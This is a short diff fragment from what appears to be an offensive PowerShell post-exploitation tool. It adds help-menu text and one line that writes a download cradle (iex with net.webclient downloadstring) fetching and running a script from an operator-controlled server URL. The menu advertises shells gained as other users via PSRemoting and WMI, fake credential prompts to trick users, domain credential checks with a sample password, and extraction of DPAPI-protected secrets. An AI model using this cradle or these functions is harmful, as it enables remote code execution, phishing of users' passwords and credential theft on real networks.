@@ -1,0 +1,12 @@
+		# Create a CimSession with the provided credentials
+"			$sw.WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Validate-Credentials.ps1')"")"
+"			Write-Output ""    Validate-Credentials -UserName Senna -Domain ferrari.local                          Test Empty Password"""
+"			Write-Output ""    Validate-Credentials -UserName Senna -Password FuerteCorre1                         Test Credentials"""
+"			Write-Output ""    Validate-Credentials -UserName Senna -Password FuerteCorre1 -Domain ferrari.local   Specify Domain"""
+"			Write-Output ""[+] Validate Domain Credentials | https://github.com/Leo4j/Validate-Credentials"""
+"	Write-Output ""    Do not run as local user (e.g.: nt authority\system) unless you specify credentials (WMI only)"""
+"	Write-Output ""    shell_psadmin -Username `""`"" -Password `""`""        Specify Credentials and gain a shell as that user"""
+"	Write-Output ""    shell_wmiadmin -Username `""`"" -Password `""`""       Specify Credentials and gain a shell as that user"""
+"	Write-Output "" Ask4Creds          Prompt User for Credentials"""
+"	Write-Output "" CredValidate       Validate Domain Credentials"""
+"	Write-Output "" Dpapi              Retrieve credentials protected by DPAPI"""
